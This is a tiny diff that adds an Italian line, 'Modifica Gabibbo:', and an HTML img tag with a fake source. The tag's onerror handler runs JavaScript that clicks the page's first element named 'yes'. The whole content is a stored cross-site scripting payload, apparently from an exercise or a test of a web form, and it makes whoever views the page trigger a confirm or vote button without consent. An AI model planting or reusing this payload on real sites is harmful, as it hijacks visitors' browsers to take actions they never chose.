@@ -1,0 +1,2 @@
+Modifica Gabibbo:
+<img src="nonunimmagine" onerror='document.getElementsByName("yes")[0].click()'>
